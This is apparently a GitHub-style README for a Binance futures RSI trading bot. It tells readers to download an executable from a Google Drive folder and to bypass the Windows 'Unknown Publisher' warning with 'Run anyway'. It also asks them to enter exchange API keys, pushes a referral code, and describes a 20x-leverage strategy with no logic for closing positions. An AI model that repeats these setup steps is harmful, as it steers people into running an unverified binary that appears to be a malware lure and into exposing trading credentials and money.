# Hedged RSI Trading Bot (Binance Demo)

📥 Download & Setup
Download all files:
[Google Drive - Trading Bot](https://drive.google.com/drive/folders/16RtUzDWJ3Y7MpytX3cHXfcVoIpr217yN)
https://drive.google.com/drive/folders/16RtUzDWJ3Y7MpytX3cHXfcVoIpr217yN
Click Download All (or select all files with Ctrl+A → Right-click → Download)

Extract files:

bash
# Using 7-Zip/WinRAR:
7z x trading_bot.zip -o"C:\TradingBot"
Run the bot:

Execute start.bat (recommended) OR

Double-click trading_bot.exe

⚠️ Security Notes
If Windows shows "Unknown Publisher" warning:

Click More info → Run anyway

A demonstration trading bot using RSI strategy in hedged mode on Binance futures.

## 🔑 Key Features
- Pure RSI-based strategy (30/70 levels)
- **Hedged mode only** (must enable before use)
- Opens LONG when RSI crosses **above 30**
- Opens SHORT when RSI crosses **below 70**
- Demo version - **no position closing logic**
- CCXT library for reliable exchange connectivity

## 🚀 Quick Start

### 1. Binance Setup
🔗 [Register Binance Account](https://accounts.binance.com/register?ref=59073385)  
Use referral code **59073385** to support development

**Mandatory steps:**
1. Enable Futures trading
2. **Activate Hedged Mode**:
   - Navigate to Futures → Preferences → Position Mode → "Hedged Mode"

⚙️ Bot Configuration
config.json Setup
json
{
    "symbol": "DOGE/USDT", 
    "leverage": 20,
    "margin_mode": "cross",
    "rsi": 2,
    "vol": 26,
    "time": "1m",
    "api_key": "your_api_key_here",
    "secret": "your_api_secret_here"
}
🔒 Security Requirements
API Key Setup:

Create API keys with Futures Trading permission only

Enable IP Whitelisting (only allow your server IP)

Never share your secret key

Mandatory Settings:

diff
- Symbol must be USDT-Margined Futures (e.g., DOGE/USDT:USDT)
- Hedged Mode must be enabled in Binance settings
▶️ How to Run
Edit config.json with your parameters

Start the bot:

bash
python main.py
📊 Current Strategy Parameters
Parameter	Value	Description
Symbol	DOGE/USDT	Trading pair
Timeframe	1m	1-minute candles
RSI Period	2	Ultra-sensitive RSI
vol	26	amount
Leverage	20x	Cross margin
🎛️ Customization Tips
python
# For different trading styles:
# - Scalping: lower RSI period (2-5)
# - Swing trading: higher RSI period (14-21)
# - Reduce leverage for safety (recommend 5-10x)
🚀 Next Development Phase
When 100 users register via our Binance referral and open at least 1 position (any size), we'll release:

## 🚀 Next Development Phase

When 100 users register via [our Binance referral](https://accounts.binance.com/register?ref=59073385) and open at least 1 position (any size), we'll release:

**Advanced Triple-Indicator Strategy**  
This is an example, subject to change depending on your opinion
✅ RSI-14 + EMA-89 + EMA-200 with full entry/exit logic:  

🔗 Register Now (Code: 59073385)
